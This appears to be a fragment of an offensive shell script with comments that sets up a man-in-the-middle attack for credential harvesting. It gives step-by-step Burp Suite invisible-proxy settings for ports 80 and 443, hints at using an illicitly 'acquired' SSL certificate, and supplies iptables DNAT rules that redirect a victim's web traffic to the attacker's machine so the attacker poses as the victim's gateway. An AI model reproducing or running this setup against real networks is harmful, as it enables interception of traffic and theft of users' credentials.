#This will enable your attacking machine to route traffic. This way, when your #victim machine makes a request to an external HTTP server you will forward the #request and intercept the server’s response. This behavior is necessary for #credential harvesting attacks. In order to use this script effective the #attacker should configure burp suite as follows:
#Step 1: Click on the proxy tab and then click on the options sub-tab.
#Step 2: Click the add button and type ‘443’ for the bind port.
#Step 3: Select the all interfaces radio button.
#Step 4: Click on the request handling tab and check the invisible proxy #support box.
#Step 5: If you've purchased or otherwise â€œacquired an SSL certificate you #can configure it on the certificate tab. If not, leave those settings the way #they are. Repeat the above steps for port ’80’ as well.

#This creates two firewall rules which will forward all outbound requests to port 80 and 443 to your attacking machine.
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination "$attackerip"
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination "$attackerip"
#This affectively causes the victim to think that you are their primary gateway
